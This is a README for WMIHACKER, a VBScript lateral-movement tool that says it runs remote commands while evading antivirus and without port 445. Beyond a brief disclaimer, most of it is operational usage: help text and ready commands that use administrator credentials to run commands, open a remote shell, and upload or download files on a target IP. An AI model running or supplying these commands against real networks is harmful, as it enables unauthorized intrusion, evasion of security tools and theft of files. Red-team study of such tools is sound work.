# WMIHACKER（No need 445 Port）
[中文版(Chinese version)](README_zh.md)

> Disclaimer: The technology involved in this project is only for security learning and  defense purposes, illegal use is prohibited!


Bypass anti-virus software lateral movement command execution test tool（No need 445 Port）

Introduction: The common WMIEXEC, PSEXEC tool execution command is to create a service or call Win32_Process.create, these methods have been intercepted by Anti-virus software 100%, so we created WMIHACKER (Bypass anti-virus software lateral movement command execution test tool（No need 445 Port）).

Main functions: 1. Command execution; 2. File upload; 3. File download

## How to use
```
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs

__          ____  __ _____   _    _          _____ _  ________ _____
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  /
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
                              v0.6beta       By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?

        WMIHACKER.vbs  /shell  host  user  pass

        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath

        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath

          /cmd          single command mode
          host          hostname or IP address
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host
```

The result is displayed after the command is executed

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1`

No results are displayed after the command is executed

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0`

shell mode

`> cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!" `

File upload: copy the local calc.exe to the remote host c:\calc.exe

`> cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"`

File download: Download the remote host calc.exe to the local c:\calc.exe

`> cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe" `
